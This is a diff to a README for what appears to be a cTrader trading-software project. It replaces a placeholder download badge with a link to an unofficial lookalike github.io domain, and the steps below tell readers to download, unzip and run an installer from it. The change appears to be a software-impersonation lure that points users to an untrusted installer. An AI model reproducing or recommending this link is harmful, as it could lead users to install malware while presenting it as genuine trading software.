@@ -8,7 +8,7 @@ It offers **automated trading with cAlgo, built-in copy trading features, and cu
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://ctrader-download-windows.github.io/.github/)
 
 1. Download and unzip the archive.  
 2. Run the installer and follow the on-screen instructions.  
